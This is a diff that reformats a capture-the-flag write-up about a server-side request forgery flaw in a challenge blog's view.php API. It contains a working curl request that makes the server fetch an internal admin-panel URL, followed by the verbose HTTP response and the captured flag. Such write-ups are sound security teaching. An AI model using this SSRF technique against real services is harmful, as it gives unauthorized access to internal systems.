@@ -16,9 +16,11 @@ The vulnerable part of the code is this code snippet
 '''
 The api endpoint code loads any url submitted to it and it makes it susceptible to Server side request forgery which occurs when a website is induced to load a particular url.
 The main task in the challenge is to load a url that can't be accessed outside.With the vulnerable part of site,I used curl to solve it by submitting the url that can't be accessed outside except eithin the server.
-#THE CURL request 
+'''
+#THE CURL request
 curl https://ecorpblog.uctf.ir/api/view.php -v -X POST --header 'Content-Type:application/json' -d '{"post": "http://admin-panel.local/"}'
-####
+'''
+'''
 ####RESPONSE#####
 * Using Stream ID: 1
 > POST /api/view.php HTTP/2
@@ -46,4 +48,5 @@ curl https://ecorpblog.uctf.ir/api/view.php -v -X POST --header 'Content-Type:ap
 <
 * Connection #1 to host ecorpblog.uctf.ir left intact
 {"status":"success","post":"uctf{4z174_1n_urm14}"}
-#########$
+'''
+
